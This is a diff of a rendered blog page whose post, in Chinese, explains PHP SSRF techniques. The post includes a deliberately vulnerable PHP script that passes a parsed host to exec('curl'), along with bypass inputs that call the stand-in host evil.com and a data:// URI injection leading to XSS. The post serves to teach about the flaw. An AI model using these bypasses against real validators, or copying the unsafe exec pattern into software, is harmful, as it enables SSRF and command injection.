@@ -81,13 +81,13 @@
 
 
 
-<meta name="description" content="写前面这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本：  测试代码： 12345678910111213141516171819&amp;lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid UR">
+<meta name="description" content="写前面 这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本：  测试代码： 12345678910111213141516171819&amp;lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid U">
 <meta name="keywords" content="php,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP SSRF Techniques">
 <meta property="og:url" content="https://prontosil.club/2019/08/21/php-ssrf-techniques-fan-yi/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="写前面这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本：  测试代码： 12345678910111213141516171819&amp;lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid UR">
+<meta property="og:description" content="写前面 这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本：  测试代码： 12345678910111213141516171819&amp;lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid U">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php4.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php5.png">
@@ -103,7 +103,7 @@
 <meta property="og:updated_time" content="2019-09-15T15:49:03.264Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP SSRF Techniques">
-<meta name="twitter:description" content="写前面这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本：  测试代码： 12345678910111213141516171819&amp;lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid UR">
+<meta name="twitter:description" content="写前面 这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本：  测试代码： 12345678910111213141516171819&amp;lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid U">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php4.png">
 
 
@@ -411,7 +411,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  630
+                  631
                 </span>
               
 
@@ -448,20 +448,22 @@
       
 
       
-        <h2 id="写前面"><a href="#写前面" class="headerlink" title="写前面"></a>写前面</h2><p>这篇文章讲的实在是太棒了 <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p>
+        <h2>写前面</h2>
+<p>这篇文章讲的实在是太棒了 <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p>
 <p>php版本：</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php4.png" alt=""></p>
 <p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>首先调用了<code>filter_var</code>进行URL的验证，然后再用<code>parse_url</code>去解析URL，php7的版本中这个函数是没有问题的</p>
 <p>同时通过<code>preg_match</code>函数限定只能以<code>google.com</code>结尾</p>
 <p>如果达到ssrf呢？</p>
-<p>正常情况下 </p>
+<p>正常情况下</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php5.png" alt=""></p>
 <p>攻击者：</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php6.png" alt=""></p>
-<p>此时$r[‘host’]显然不是以<code>google.com</code>结尾的</p>
-<h2 id="绕过URL验证和正则表达式"><a href="#绕过URL验证和正则表达式" class="headerlink" title="绕过URL验证和正则表达式"></a>绕过URL验证和正则表达式</h2><blockquote>
+<p>此时$r['host']显然不是以<code>google.com</code>结尾的</p>
+<h2>绕过URL验证和正则表达式</h2>
+<blockquote>
 <p>许多URL schema保留某些特殊含义的字符：它们在URL的特定于方案的部分中的外观具有指定的语义。如果在方案中保留对应于八位字节的字符，则必须对八位字节进行编码。字符“;”，“/”，“？”，“：”，“@”，“=”和“＆”可以保留用于方案内的特殊含义。在方案中不能保留其他字符。</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php7.png" alt="什么是URL schema"></p>
@@ -469,28 +471,34 @@
 <p>一个可能是用<code>name;v=1.1</code>来表示name=version 1.1,然而也可以用<code>name,1.1</code>达到相同的效果，这根据算法来区分</p>
 <p>curl或者wget会认为<code>evil.com;google.com</code>中<code>hostname</code>为<code>evil.com</code>,<code>querystring</code>为<code>google.com</code></p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php8.png" alt=""></p>
-<p>但是并没有绕过<code>filter_var</code>函数<br><code>filter_var()</code>函数可以解析很多不同的URL scheme</p>
+<p>但是并没有绕过<code>filter_var</code>函数
+<code>filter_var()</code>函数可以解析很多不同的URL scheme</p>
 <p>如果改成这样：</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php9.png" alt="随便改，改成不认识的就行"></p>
 <p>此时已经成功地绕过了URL验证和正则表达式</p>
 <p>但是curl命令却没有执行，于是考虑加上端口号</p>
 <p>再次修改：</p>
-<p><code>php test.php &quot;111://evil.com:80;google.com:80/&quot;</code><br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php10.png" alt=""></p>
+<p><code>php test.php &quot;111://evil.com:80;google.com:80/&quot;</code>
+<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php10.png" alt=""></p>
 <p>同样用逗号也行</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php11.png" alt=""></p>
 <p>parse_url只会尽可能地分割URL，而不是验证它，作者还提到了一种更好的方式：</p>
 <p><code>0://evil$google.com</code></p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php12.png" alt=""></p>
 <p>注意这里必须用单引号括起来。。</p>
-<h2 id="实现XSS"><a href="#实现XSS" class="headerlink" title="实现XSS"></a>实现XSS</h2><p>作者之后修改了代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         $a = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">         <span class="keyword">echo</span>($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>作者想要注入一点东西,但是并没有成功<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php13.png" alt=""></p>
+<h2>实现XSS</h2>
+<p>作者之后修改了代码：</p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         $a = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">         <span class="keyword">echo</span>($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>作者想要注入一点东西,但是并没有成功
+<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php13.png" alt=""></p>
 <p>继续尝试：</p>
 <p><code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</code></p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php14.png" alt="此时注入成功了"></p>
 <p>那么XSS就很容易了</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">PHP SSRF Techniques</a></p>
-<p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener"><br>Some trick in ssrf and unserialize()</a>/)</p>
+<h2>参考</h2>
+<p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">PHP SSRF Techniques</a></p>
+<p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/" target="_blank" rel="noopener">
+Some trick in ssrf and unserialize()</a></p>
 
       
     </div>
@@ -616,7 +624,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">71</span>
+                  <span class="site-state-item-count">72</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -725,7 +733,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写前面"><span class="nav-number">1.</span> <span class="nav-text">写前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过URL验证和正则表达式"><span class="nav-number">2.</span> <span class="nav-text">绕过URL验证和正则表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现XSS"><span class="nav-number">3.</span> <span class="nav-text">实现XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">写前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">绕过URL验证和正则表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">实现XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
